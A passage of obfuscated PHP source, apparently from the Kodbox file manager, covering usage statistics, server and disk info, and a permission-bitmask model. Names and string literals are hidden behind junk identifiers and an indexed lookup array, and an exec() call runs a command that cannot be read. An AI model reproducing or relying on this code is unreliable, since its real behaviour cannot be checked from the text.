$this->field = $–Óš“·Ô[$º‘ÌÎ“‰][$óµÈœã­[328]]; return !0; } public function listData($×™€»“ = false, $‚¹Èú€ = "\155\x6f\x64\x69\x66\x79\x54\151\155\x65", $Ú¤ñ–øŠ = false) { return parent::listData($×™€»“, $‚¹Èú€, $Ú¤ñ–øŠ); } public function trendList($ï¬ÏÌµñ) { $ÓåßùêÈ =& $_SERVER[ •ŒÓîÆ]; $Ñ¼ë£òî = $this->listData(); if ($Ñ¼ë£òî) { $â²äÔ³ = end($Ñ¼ë£òî); $±¦Ç ƒï = date($ÓåßùêÈ[1825], strtotime($ÓåßùêÈ[1826])); if ($â²äÔ³[$ÓåßùêÈ[241]] == $±¦Ç ƒï) { return $Ñ¼ë£òî; } $ “÷·Ú¶ = strtotime($â²äÔ³[$ÓåßùêÈ[241]]); } if (!isset($ “÷·Ú¶)) { $×üš£™ = $ï¬ÏÌµñ == $ÓåßùêÈ[642] ? $ÓåßùêÈ[579] : $ÓåßùêÈ[866]; $ “÷·Ú¶ = Model($×üš£™)->min($ÓåßùêÈ[217]); } $ªÄ€”Ø¢ = $ÓåßùêÈ[1827] . ucfirst($ï¬ÏÌµñ); $Øç²ıŞ… = $this->dateList($ “÷·Ú¶); foreach ($Øç²ıŞ… as $±¦Ç ƒï) { $this->{$ªÄ€”Ø¢}($±¦Ç ƒï); } return $this->listData(); } private function dateList($…ÕÉŸñ¬) { $†ç‘¬‘÷ =& $_SERVER[ •ŒÓîÆ]; $•şòØÆé = $…ÕÉŸñ¬; $®§ßãÀ¯ = strtotime($†ç‘¬‘÷[1826]); $•ßÀ›óœ = array(); while ($•şòØÆé <= $®§ßãÀ¯) { $•ßÀ›óœ[] = date($†ç‘¬‘÷[1825], $•şòØÆé); $•şòØÆé = strtotime($†ç‘¬‘÷[1828], $•şòØÆé); } return $•ßÀ›óœ; } public function _recordUser($¥Œõµûú = '') { $Ñ…¢®¿£ =& $_SERVER[ •ŒÓîÆ]; $¦ ‘Ñ£Œ = strtotime(date($Ñ…¢®¿£[1829], strtotime($¥Œõµûú))); $óúü—Şô = strtotime(date($Ñ…¢®¿£[1830], strtotime($¥Œõµûú))); $üŠ»¬ïÎ = array($Ñ…¢®¿£[217] => array($Ñ…¢®¿£[1054], $óúü—Şô)); $ÓöÙğ½¦ = Model($Ñ…¢®¿£[579])->where($üŠ»¬ïÎ)->count($Ñ…¢®¿£[1690]); $üŠ»¬ïÎ[$Ñ…¢®¿£[217]] = array($Ñ…¢®¿£[388], array($¦ ‘Ñ£Œ, $óúü—Şô)); $¼É¹“äÚ = Model($Ñ…¢®¿£[579])->where($üŠ»¬ïÎ)->count($Ñ…¢®¿£[1690]); $üŠ»¬ïÎ[$Ñ…¢®¿£[33]] = $Ñ…¢®¿£[1831]; $¤ĞöÅºİ = Model($Ñ…¢®¿£[1832])->where($üŠ»¬ïÎ)->count($Ñ…¢®¿£[1833]); $œî¢¯³Ê = array($Ñ…¢®¿£[241] => $¥Œõµûú, $Ñ…¢®¿£[806] => (int) $ÓöÙğ½¦, $Ñ…¢®¿£[1818] => (int) $¼É¹“äÚ, $Ñ…¢®¿£[1819] => (int) $¤ĞöÅºİ); return $this->insert($œî¢¯³Ê); } public function _recordStore($Ü»”ë¡ = '') { $º¥¯ï¤Ç =& $_SERVER[ •ŒÓîÆ]; $şü¾ÜÜò = strtotime(date($º¥¯ï¤Ç[1830], strtotime($Ü»”ë¡))); $Áµ©ƒ¶‰ = array($º¥¯ï¤Ç[217] => array($º¥¯ï¤Ç[1054], $şü¾ÜÜò)); $˜ÉšˆÛ = Model($º¥¯ï¤Ç[523])->where($Áµ©ƒ¶‰)->sum($º¥¯ï¤Ç[78]); $Áµ©ƒ¶‰[$º¥¯ï¤Ç[464]] = 0; $ñ”Œï…ï = Model($º¥¯ï¤Ç[866])->where($Áµ©ƒ¶‰)->sum($º¥¯ï¤Ç[78]); $Áµ©ƒ¶‰[$º¥¯ï¤Ç[180]] = 1; $İù² ×í = Model($º¥¯ï¤Ç[866])->where($Áµ©ƒ¶‰)->sum($º¥¯ï¤Ç[78]); $Áµ©ƒ¶‰[$º¥¯ï¤Ç[180]] = 2; $è„§¾ï = Model($º¥¯ï¤Ç[866])->where($Áµ©ƒ¶‰)->sum($º¥¯ï¤Ç[78]); $Å—¯é¥Ç = array($º¥¯ï¤Ç[241] => $Ü»”ë¡, $º¥¯ï¤Ç[804] => (int) $ñ”Œï…ï, $º¥¯ï¤Ç[1822] => (int) $˜ÉšˆÛ, $º¥¯ï¤Ç[1823] => (int) $İù² ×í, $º¥¯ï¤Ç[1824] => (int) $è„§¾ï); return $this->insert($Å—¯é¥Ç); } public function trend($Á¼Ôõ˜Æ, $¶ıŸ±ˆ) { $„¶Íãş• =& $_SERVER[ •ŒÓîÆ]; if (!$this->init($Á¼Ôõ˜Æ)) { return !1; } $÷ äúû± = $this->trendList($Á¼Ôõ˜Æ); if ($÷ äúû± && $¶ıŸ±ˆ != $„¶Íãş•[1663]) { $Ñ°¿ò¾¶ = $÷ äúû±[0][$„¶Íãş•[241]]; $¥ÍìÃÇ³ = $this->validDate($¶ıŸ±ˆ, $Ñ°¿ò¾¶); $øğ© Ó = array(); $îæŒ³§° = array_to_keyvalue($÷ äúû±, $„¶Íãş•[241]); foreach ($¥ÍìÃÇ³ as $É—¬¥óÓ) { if (isset($îæŒ³§°[$É—¬¥óÓ])) { $†¬ªˆí = $îæŒ³§°[$É—¬¥óÓ]; } else { $†¬ªˆí = end($÷ äúû±); $†¬ªˆí[$„¶Íãş•[241]] = $É—¬¥óÓ; if ($Á¼Ôõ˜Æ == $„¶Íãş•[642]) { $†¬ªˆí[$„¶Íãş•[1818]] = $†¬ªˆí[$„¶Íãş•[1819]] = 0; } } $øğ© Ó[] = $†¬ªˆí; } $÷ äúû± = $øğ© Ó; } $‰€ÅóŞš = array($„¶Íãş•[642] => array($„¶Íãş•[806] => LNG($„¶Íãş•[1834]), $„¶Íãş•[1818] => LNG($„¶Íãş•[1835]), $„¶Íãş•[1819] => LNG($„¶Íãş•[1836])), $„¶Íãş•[1820] => array($„¶Íãş•[804] => LNG($„¶Íãş•[1837]), $„¶Íãş•[1822] => LNG($„¶Íãş•[1838]), $„¶Íãş•[1823] => LNG($„¶Íãş•[1839]), $„¶Íãş•[1824] => LNG($„¶Íãş•[1840]))); $€§ŸË§Ñ = array($„¶Íãş•[642] => $„¶Íãş•[1841], $„¶Íãş•[1820] => $„¶Íãş•[78]); if (empty($÷ äúû±)) { $É—¬¥óÓ = date($„¶Íãş•[1825], strtotime($„¶Íãş•[1826])); $Ù¢ µ’¹ = array($„¶Íãş•[241] => $É—¬¥óÓ); foreach ($‰€ÅóŞš[$Á¼Ôõ˜Æ] as $â‹¯€ãú => $ı²Ùã”) { $Ù¢ µ’¹[$â‹¯€ãú] = 0; } $÷ äúû±[] = $Ù¢ µ’¹; } $Å½ıƒ¾ = array(); foreach ($÷ äúû± as $ı²Ùã”) { if ($Á¼Ôõ˜Æ == $„¶Íãş•[1820] && $ı²Ùã”[$„¶Íãş•[1822]] > $ı²Ùã”[$„¶Íãş•[804]]) { $ı²Ùã”[$„¶Íãş•[1822]] = $ı²Ùã”[$„¶Íãş•[804]]; } foreach ($‰€ÅóŞš[$Á¼Ôõ˜Æ] as $â‹¯€ãú => $™ùµğ¸) { $†¬ªˆí = array($„¶Íãş•[241] => $ı²Ùã”[$„¶Íãş•[241]], $„¶Íãş•[1585] => $™ùµğ¸); $†¬ªˆí[$€§ŸË§Ñ[$Á¼Ôõ˜Æ]] = isset($ı²Ùã”[$â‹¯€ãú]) ? $ı²Ùã”[$â‹¯€ãú] : 0; $Å½ıƒ¾[] = $†¬ªˆí; } } return $Å½ıƒ¾; } public function validDate($‰Œõ˜˜Š, $ÒŠºŞª) { $ş§àöÏ =& $_SERVER[ •ŒÓîÆ]; $µï„«Ò· = date($ş§àöÏ[1825], strtotime($ş§àöÏ[1826])); $‚©æØ¡æ = array($µï„«Ò·); switch ($‰Œõ˜˜Š) { case $ş§àöÏ[1670]: $¸Ë‰ÃÔÉ = mktime(0, 0, 0, date($ş§àöÏ[1842]), date($ş§àöÏ[1402]) - date($ş§àöÏ[1467]) + 7 - 7, date($ş§àöÏ[1843])); $§÷™‚ş = 0; do { $”ç¢Ëàß = date($ş§àöÏ[1825], $¸Ë‰ÃÔÉ - 3600 * 24 * 7 * $§÷™‚ş); $‚©æØ¡æ[] = $”ç¢Ëàß; $§÷™‚ş++; } while ($ÒŠºŞª < $”ç¢Ëàß); break; case $ş§àöÏ[1668]: $§÷™‚ş = 1; do { $ûİ’ß±è = date($ş§àöÏ[1844], strtotime("\x2d\x20{$§÷™‚ş}\40\155\x6f\x6e\164\x68\x73")); $‚©æØ¡æ[] = $ûİ’ß±è; $§÷™‚ş++; } while ($ÒŠºŞª < $ûİ’ß±è); break; case $ş§àöÏ[1845]: $«ñÕŠ÷˜ = (int) date($ş§àöÏ[1843], strtotime($ÒŠºŞª)); $ªÛĞ†Ş‹ = (int) date($ş§àöÏ[1843]); if ($«ñÕŠ÷˜ >= $ªÛĞ†Ş‹) { break; } for ($«ñÕŠ÷˜; $«ñÕŠ÷˜ < $ªÛĞ†Ş‹; $«ñÕŠ÷˜++) { $‚©æØ¡æ[] = $«ñÕŠ÷˜ . $ş§àöÏ[1846]; } break; default: break; } if ($ÒŠºŞª > end($‚©æØ¡æ)) { array_pop($‚©æØ¡æ); } sort($‚©æØ¡æ); return $‚©æØ¡æ; } public function listTable($Ó‚Áì›™) { $ÃûôÉù = ucfirst($Ó‚Áì›™); return Model($ÃûôÉù)->listData(); } public function option($û“ş¿æ¹) { $ÑªˆÑó = $_SERVER[ •ŒÓîÆ][1847] . ucfirst($û“ş¿æ¹); return $this->{$ÑªˆÑó}(); } private function optionUser() { $İÏ†ú Œ =& $_SERVER[ •ŒÓîÆ]; $õê¶ä½® = Model($İÏ†ú Œ[579])->count($İÏ†ú Œ[1690]); $ÇÁÚĞ™ = Model($İÏ†ú Œ[579])->where($İÏ†ú Œ[1848])->count($İÏ†ú Œ[1690]); $Ô¡Ë¨— = intval($GLOBALS[$İÏ†ú Œ[6]][$İÏ†ú Œ[404]][$İÏ†ú Œ[1642]]) / 3600; $Û—ƒ…¿ = strtotime("\55{$Ô¡Ë¨—}\x20\x68\x6f\165\x72\163"); $¿·–œ¿Ã = strtotime(date($İÏ†ú Œ[1829])); if ($Û—ƒ…¿ < $¿·–œ¿Ã) { $Û—ƒ…¿ = $¿·–œ¿Ã; } $Ÿñ¥üïÛ = array($İÏ†ú Œ[1849] => array($İÏ†ú Œ[1055], $Û—ƒ…¿)); $©®ÕüÄ = (int) Model($İÏ†ú Œ[579])->where($Ÿñ¥üïÛ)->count($İÏ†ú Œ[1690]); if (!$©®ÕüÄ) { $©®ÕüÄ = 1; } $Ÿñ¥üïÛ = array($İÏ†ú Œ[1849] => array($İÏ†ú Œ[1055], $¿·–œ¿Ã)); $¹şæ†šÃ = Model($İÏ†ú Œ[579])->where($Ÿñ¥üïÛ)->count($İÏ†ú Œ[1690]); return array($İÏ†ú Œ[799] => (int) $õê¶ä½®, $İÏ†ú Œ[1850] => (int) ($õê¶ä½® - $ÇÁÚĞ™), $İÏ†ú Œ[1851] => (int) $ÇÁÚĞ™, $İÏ†ú Œ[1852] => (int) $¹şæ†šÃ, $İÏ†ú Œ[1853] => $©®ÕüÄ); } private function optionFile() { $¶°òÚô‘ =& $_SERVER[ •ŒÓîÆ]; $Îİ¿ç’Ö = $this->sourceSize(); $…Úï·Ù = $Îİ¿ç’Ö[$¶°òÚô‘[78]]; $¨à÷æğÉ = $Îİ¿ç’Ö[$¶°òÚô‘[1822]]; $ôãû¨øå = Model($¶°òÚô‘[866])->where(array($¶°òÚô‘[464] => 0))->count($¶°òÚô‘[183]); $ÈÅ ¯§ = array($¶°òÚô‘[464] => 0, $¶°òÚô‘[217] => array($¶°òÚô‘[1055], strtotime(date($¶°òÚô‘[1829])))); $Õ„Ú€÷ = Model($¶°òÚô‘[866])->where($ÈÅ ¯§)->sum($¶°òÚô‘[78]); $Ó¿¹ë©´ = Model($¶°òÚô‘[866])->where($ÈÅ ¯§)->count($¶°òÚô‘[183]); return array($¶°òÚô‘[804] => $…Úï·Ù, $¶°òÚô‘[1822] => $¨à÷æğÉ, $¶°òÚô‘[1854] => $…Úï·Ù - $¨à÷æğÉ, $¶°òÚô‘[1855] => (int) $Õ„Ú€÷, $¶°òÚô‘[806] => (int) $ôãû¨øå, $¶°òÚô‘[1856] => (int) $Ó¿¹ë©´); } private function optionAccess() { $Ô¶ÈÕ¨ç =& $_SERVER[ •ŒÓîÆ]; return array($Ô¶ÈÕ¨ç[799] => $this->typeLogCnt(), $Ô¶ÈÕ¨ç[109] => $this->typeLogCnt($Ô¶ÈÕ¨ç[109]), $Ô¶ÈÕ¨ç[504] => $this->typeLogCnt($Ô¶ÈÕ¨ç[504]), $Ô¶ÈÕ¨ç[1857] => $this->typeLogCnt($Ô¶ÈÕ¨ç[1857]), $Ô¶ÈÕ¨ç[1858] => $this->typeLogCnt($Ô¶ÈÕ¨ç[1858]), $Ô¶ÈÕ¨ç[642] => $this->typeLogCnt($Ô¶ÈÕ¨ç[12], $Ô¶ÈÕ¨ç[1833])); } private function typeLogCnt($„¤Ï­à· = '', $¶û†·—Õ = "\x69\144") { $–²ô±Ô =& $_SERVER[ •ŒÓîÆ]; $ˆË°ğ¿¼ = array($–²ô±Ô[109] => array($–²ô±Ô[1859], $–²ô±Ô[1860]), $–²ô±Ô[504] => array($–²ô±Ô[1861], $–²ô±Ô[1862]), $–²ô±Ô[1857] => array($–²ô±Ô[1863], $–²ô±Ô[1864], $–²ô±Ô[1865]), $–²ô±Ô[1858] => array($–²ô±Ô[1866], $–²ô±Ô[1867]), $–²ô±Ô[1868] => array($–²ô±Ô[1869], $–²ô±Ô[1870], $–²ô±Ô[1871])); $åÖ¾Ñ«§ = strtotime(date($–²ô±Ô[1829])); $å«ÙãíÙ = array($–²ô±Ô[217] => array($–²ô±Ô[1055], $åÖ¾Ñ«§)); if ($„¤Ï­à·) { $å«ÙãíÙ[$–²ô±Ô[33]] = array($–²ô±Ô[7], $ˆË°ğ¿¼[$„¤Ï­à·]); } $ÍÚÔúœç = Model($–²ô±Ô[1832])->where($å«ÙãíÙ)->count($¶û†·—Õ); return (int) $ÍÚÔúœç; } private function optionServer() { $½Ï˜×â¶ =& $_SERVER[ •ŒÓîÆ]; $øĞÌÕÜê = $this->diskDriver(); $ş „’µ = KodIO::defaultDriver(); $€ÍÊàÃĞ = array($½Ï˜×â¶[858] => $ş „’µ[$½Ï˜×â¶[453]]); $¹ô´À½ = Model($½Ï˜×â¶[523])->where($€ÍÊàÃĞ)->sum($½Ï˜×â¶[78]); $ÜÛÙ«á = explode($½Ï˜×â¶[53], $_SERVER[$½Ï˜×â¶[146]]); $±Ú¸¤† = $ÜÛÙ«á[0]; $ŞãŸ¦ = $GLOBALS[$½Ï˜×â¶[6]][$½Ï˜×â¶[21]]; $¤€ÁóÀÍ = $ŞãŸ¦[$½Ï˜×â¶[1017]]; if ($¤€ÁóÀÍ == $½Ï˜×â¶[1005]) { $³™Œ†¥× = explode($½Ï˜×â¶[1323], $ŞãŸ¦[$½Ï˜×â¶[1016]]); $¤€ÁóÀÍ = $³™Œ†¥×[0]; } if ($¤€ÁóÀÍ == $½Ï˜×â¶[953] || $¤€ÁóÀÍ == $½Ï˜×â¶[845]) { $ûÏ£€‚ = Model()->db()->query($½Ï˜×â¶[1872]); $Ø¬…Ô ú = $ûÏ£€‚[0] && isset($ûÏ£€‚[0][$½Ï˜×â¶[1584]]) ? $ûÏ£€‚[0][$½Ï˜×â¶[1584]] : 0; $¤€ÁóÀÍ = $½Ï˜×â¶[1873] . ($Ø¬…Ô ú ? $½Ï˜×â¶[8] . $Ø¬…Ô ú : $½Ï˜×â¶[12]); } $™¡Â°Á = $GLOBALS[$½Ï˜×â¶[6]][$½Ï˜×â¶[404]][$½Ï˜×â¶[868]]; return array($½Ï˜×â¶[1874] => $øĞÌÕÜê ? $øĞÌÕÜê[$½Ï˜×â¶[1875]] : 0, $½Ï˜×â¶[1876] => $øĞÌÕÜê ? $øĞÌÕÜê[$½Ï˜×â¶[1877]] : 0, $½Ï˜×â¶[1878] => (int) $ş „’µ[$½Ï˜×â¶[1875]] * 1024 * 1024 * 1024, $½Ï˜×â¶[1879] => (int) $¹ô´À½, $½Ï˜×â¶[1880] => ucfirst($±Ú¸¤†), $½Ï˜×â¶[1881] => $½Ï˜×â¶[1882] . PHP_VERSION, $½Ï˜×â¶[1883] => phpBuild64() ? 64 : 32, $½Ï˜×â¶[798] => str_replace($½Ï˜×â¶[1171], $½Ï˜×â¶[1033], $¤€ÁóÀÍ), $½Ï˜×â¶[404] => ucfirst($™¡Â°Á), $½Ï˜×â¶[32] => $_SERVER[$½Ï˜×â¶[1884]]); } private function diskDriver() { $®ÑóÆ®ø =& $_SERVER[ •ŒÓîÆ]; $¯Éöˆû¼ = $®ÑóÆ®ø[8]; $ÀÁ¿Ÿ§ƒ = $GLOBALS[$®ÑóÆ®ø[6]][$®ÑóÆ®ø[1340]] == $®ÑóÆ®ø[1341]; if ($ÀÁ¿Ÿ§ƒ) { $¯Éöˆû¼ = $®ÑóÆ®ø[1885]; if (function_exists($®ÑóÆ®ø[1886])) { exec($®ÑóÆ®ø[1887], $ú×¿Â‘Î); $¯Éöˆû¼ = $ú×¿Â‘Î[1] . $®ÑóÆ®ø[8]; } } if (!file_exists($¯Éöˆû¼)) { return; } $üÄ‹Şéˆ = @disk_total_space($¯Éöˆû¼); $Å½šØËˆ = $üÄ‹Şéˆ - @disk_free_space($¯Éöˆû¼); return array($®ÑóÆ®ø[1875] => $üÄ‹Şéˆ, $®ÑóÆ®ø[1877] => $Å½šØËˆ); } public function fileChart($ëëÃí™ç) { $£ŠÜÙ´ =& $_SERVER[ •ŒÓîÆ]; if (isset($ëëÃí™ç[$£ŠÜÙ´[1690]])) { return Model($£ŠÜÙ´[866])->userFileTypeProfile($ëëÃí™ç[$£ŠÜÙ´[1690]]); } if (isset($ëëÃí™ç[$£ŠÜÙ´[1888]])) { return Model($£ŠÜÙ´[866])->groupFileTypeProfile($ëëÃí™ç[$£ŠÜÙ´[1888]]); } $¿ÉŒÄ†İ = $this->sourceSize(); $´¨èşº = array($£ŠÜÙ´[182] => 0, $£ŠÜÙ´[180] => 1); $À“ğüğ = Model($£ŠÜÙ´[866])->where($´¨èşº)->sum($£ŠÜÙ´[78]); $´¨èşº[$£ŠÜÙ´[180]] = 2; $ÌÑæõÆä = Model($£ŠÜÙ´[866])->where($´¨èşº)->sum($£ŠÜÙ´[78]); return array($£ŠÜÙ´[804] => $¿ÉŒÄ†İ[$£ŠÜÙ´[78]], $£ŠÜÙ´[1822] => $¿ÉŒÄ†İ[$£ŠÜÙ´[1822]], $£ŠÜÙ´[1823] => (int) $À“ğüğ, $£ŠÜÙ´[1824] => (int) $ÌÑæõÆä); } private function sourceSize() { $Ê‚ÚÌîŸ =& $_SERVER[ •ŒÓîÆ]; $­°¬¼Çõ = Model($Ê‚ÚÌîŸ[866])->where(array($Ê‚ÚÌîŸ[464] => 0))->sum($Ê‚ÚÌîŸ[78]); $Ã§Î×‘× = Model($Ê‚ÚÌîŸ[523])->sum($Ê‚ÚÌîŸ[78]); if ($Ã§Î×‘× > $­°¬¼Çõ) { $Ã§Î×‘× = $­°¬¼Çõ; } return array($Ê‚ÚÌîŸ[78] => (int) $­°¬¼Çõ, $Ê‚ÚÌîŸ[1822] => (int) $Ã§Î×‘×); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ö‡š¬¥× =& $_SERVER[ •ŒÓîÆ]; $³öîÒÕì = array(array($ö‡š¬¥×[473] => LNG($ö‡š¬¥×[1889]), $ö‡š¬¥×[1890] => $ö‡š¬¥×[1891], $ö‡š¬¥×[1892] => 1, $ö‡š¬¥×[1893] => 1, $ö‡š¬¥×[1894] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ö‡š¬¥×[473] => LNG($ö‡š¬¥×[1895]), $ö‡š¬¥×[1890] => $ö‡š¬¥×[1896], $ö‡š¬¥×[1892] => 2, $ö‡š¬¥×[1893] => 1, $ö‡š¬¥×[1894] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ö‡š¬¥×[473] => LNG($ö‡š¬¥×[1897]), $ö‡š¬¥×[1890] => $ö‡š¬¥×[1898], $ö‡š¬¥×[1892] => 3, $ö‡š¬¥×[1893] => 1, $ö‡š¬¥×[1894] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ö‡š¬¥×[473] => LNG($ö‡š¬¥×[1899]), $ö‡š¬¥×[1890] => $ö‡š¬¥×[1900], $ö‡š¬¥×[1892] => 4, $ö‡š¬¥×[1893] => 1, $ö‡š¬¥×[1894] => self::AUTH_SHOW | self::AUTH_VIEW), array($ö‡š¬¥×[473] => LNG($ö‡š¬¥×[1901]), $ö‡š¬¥×[1890] => $ö‡š¬¥×[1902], $ö‡š¬¥×[1892] => 5, $ö‡š¬¥×[1893] => 1, $ö‡š¬¥×[1894] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ö‡š¬¥×[473] => LNG($ö‡š¬¥×[1903]), $ö‡š¬¥×[1890] => $ö‡š¬¥×[1904], $ö‡š¬¥×[1892] => 6, $ö‡š¬¥×[1893] => 1, $ö‡š¬¥×[1894] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ö‡š¬¥×[473] => LNG($ö‡š¬¥×[1905]), $ö‡š¬¥×[1890] => $ö‡š¬¥×[1906], $ö‡š¬¥×[1892] => 7, $ö‡š¬¥×[1893] => 1, $ö‡š¬¥×[1894] => 0)); return $³öîÒÕì; } public static function authCheck($Šº¼Í˜Ø, $âÔô×ö–) { $†ôÀéÒ¥ =& $_SERVER[ •ŒÓîÆ]; $Šº¼Í˜Ø = intval($Šº¼Í˜Ø); if ($GLOBALS[$†ôÀéÒ¥[548]] && $GLOBALS[$†ôÀéÒ¥[6]][$†ôÀéÒ¥[1907]]) { return !0; } if ($Šº¼Í˜Ø <= 0) { return !1; } if (($Šº¼Í˜Ø & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Šº¼Í˜Ø & $âÔô×ö–); } public static function authCheckShow($«â·úÔœ) { return self::authCheck($«â·úÔœ, self::AUTH_SHOW); } public static function authCheckView($—óÅ´‰—) { return self::authCheck($—óÅ´‰—, self::AUTH_VIEW); } public static function authCheckDownload($ÔÓæîÒ) { return self::authCheck($ÔÓæîÒ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ú âÕ) { return self::authCheck($ú âÕ, self::AUTH_UPLOAD); } public static function authCheckEdit($ñĞì»ö„) { return self::authCheck($ñĞì»ö„, self::AUTH_EDIT); } public static function authCheckRemove($¯¡‚ƒî÷) { return self::authCheck($¯¡‚ƒî÷, self::AUTH_REMOVE); } public static function authCheckShare($®üëêäÌ) { return self::authCheck($®üëêäÌ, self::AUTH_SHARE); } public static function authCheckComment($ÙÒ„¨¦¶) { return self::authCheck($ÙÒ„¨¦¶, self::AUTH_COMMENT); } public static function authCheckEvent($¼Á¦Ø½ğ) { return self::authCheck($¼Á¦Ø½ğ, self::AUTH_EVENT); } public static function authCheckRoot($àë û­Â) { return self::authCheck($àë û­Â, self::AUTH_ROOT); } public static function authCheckAction($ïÖ´ô˜ß, $„¬î¢†™) { $Œæ»¿±Ò =& $_SERVER[ •ŒÓîÆ]; $ úñ ‰ = array($Œæ»¿±Ò[1908] => self::AUTH_VIEW, $Œæ»¿±Ò[1235] => self::AUTH_DOWNLOAD, $Œæ»¿±Ò[109] => self::AUTH_UPLOAD, $Œæ»¿±Ò[1858] => self::AUTH_EDIT, $Œæ»¿±Ò[1857] => self::AUTH_REMOVE, $Œæ»¿±Ò[1868] => self::AUTH_SHARE, $Œæ»¿±Ò[409] => self::AUTH_COMMENT, $Œæ»¿±Ò[1678] => self::AUTH_EVENT, $Œæ»¿±Ò[1909] => self::AUTH_ROOT); if (!isset($ úñ ‰[$„¬î¢†™])) { return; } $è¿ÚºâÎ = $ úñ ‰[$„¬î¢†™]; $ïÖ´ô˜ß = intval($ïÖ´ô˜ß); if ($ïÖ´ô˜ß <= 0) { return !1; } if (($ïÖ´ô˜ß & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ïÖ´ô˜ß & $è¿ÚºâÎ); } public static function authDisable($á°™ƒ“î, $´ëÈŠ»ó) { if (intval($á°™ƒ“î) <= 0) { return 0; } return intval($á°™ƒ“î) & ~$´ëÈŠ»ó; } public $optionType = "\123\171\x73\x74\145\x6d\x2e\163\157\x75\162\x63\x65\101\x75\x74\150\x4c\151\163\x74"; public $field = array("\x6e\x61\155\x65", "\141\x75\164\150", "\x6c\x61\142\x65\154", "\x64\151\x73\x70\154\141\x79", "\163\171\x73\164\x65\155", "\x73\157\162\x74"); public function initData() { $ØâúŞÕ = $this->authDefault(); foreach ($ØâúŞÕ as $¥ÂĞ¤Ñ´) { $this->add($¥ÂĞ¤Ñ´); } } public function findAuth($¼œŸïŞ’, $óŠ×Å¼ä) { $é„›×ï =& $_SERVER[ •ŒÓîÆ]; $Ï—µŸë‘ = parent::listData(); foreach ($Ï—µŸë‘ as $Ö…„ßç) { $¹ö«»Ì = intval($Ö…„ßç[$é„›×ï[466]]); if ($¹ö«»Ì <= 0 || $Ö…„ßç[$é„›×ï[1910]] == 0) { continue; } if (($¹ö«»Ì & $¼œŸïŞ’) != $¼œŸïŞ’) { continue; } if (($¹ö«»Ì & $óŠ×Å¼ä) != 0) { continue; } return $Ö…„ßç[$é„›×ï[453]]; } return !1; } public function findAuthReadOnly() { $–ïğßÓ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÄÅºÔöÃ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($–ïğßÓ, $ÄÅºÔöÃ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ã”É–÷– =& $_SERVER[ •ŒÓîÆ]; $Ïœ´ãí³ = parent::listData(); $‰† Ï¿ä = !1; foreach ($Ïœ´ãí³ as $ï‰íî†¤) { if ($ï‰íî†¤[$ã”É–÷–[466]] <= 0 || $ï‰íî†¤[$ã”É–÷–[1910]] == $ã”É–÷–[214]) { continue; } if (!$‰† Ï¿ä) { $‰† Ï¿ä = $ï‰íî†¤; continue; } if ($‰† Ï¿ä[$ã”É–÷–[466]] > $ï‰íî†¤[$ã”É–÷–[466]]) { $‰† Ï¿ä = $ï‰íî†¤; } } return $‰† Ï¿ä ? $‰† Ï¿ä[$ã”É–÷–[453]] : $ã”É–÷–[12]; } public function listData($Û˜ï­Ï = false, $ŸÑüËí¾ = "\163\x6f\162\164", $¡êâñ³² = false) { return parent::listData($Û˜ï­Ï, $ŸÑüËí¾, $¡êâñ³²); } public function update($á‘ú´÷Ø, $àÍ›Ø“¬) { $²…²üÏÅ =& $_SERVER[ •ŒÓîÆ]; $àğ®œ³ı = parent::listData($á‘ú´÷Ø); $¾äÌğî = $this->findByName($àÍ›Ø“¬[$²…²üÏÅ[32]]); if (!$àğ®œ³ı || $¾äÌğî && $¾äÌğî[$²…²üÏÅ[453]] != $àğ®œ³ı[$²…²üÏÅ[453]]) { return !1; } $this->filterAuth($àÍ›Ø“¬[$²…²üÏÅ[466]]); return parent::update($á‘ú´÷Ø, $àÍ›Ø“¬); } public function remove($»ÒŠ¼Š) { $’»áè¥‘ = parent::listData($»ÒŠ¼Š); if (!$’»áè¥‘ || $’»áè¥‘[$_SERVER[ •ŒÓîÆ][181]]) { return !1; } return parent::remove($»ÒŠ¼Š); } public function add($ïÍØ¨§ = array()) { $¡¦¤Áœà =& $_SERVER[ •ŒÓîÆ]; if ($this->findByName($ïÍØ¨§[$¡¦¤Áœà[32]])) { return !1; } $¼·Àî» = array($¡¦¤Áœà[32] => $¡¦¤Áœà[12], $¡¦¤Áœà[466] => 1, $¡¦¤Áœà[1911] => $¡¦¤Áœà[1898], $¡¦¤Áœà[1910] => 1, $¡¦¤Áœà[181] => 0, $¡¦¤Áœà[1912] => 0); $ïÍØ¨§ = array_merge($¼·Àî», $ïÍØ¨§); $ïÍØ¨§[$¡¦¤Áœà[1912]] = $this->getSort(); $this->filterAuth($ïÍØ¨§[$¡¦¤Áœà[466]]); return parent::insert($ïÍØ¨§); } private function getSort() { $Â¶ºìÙ’ =& $_SERVER[ 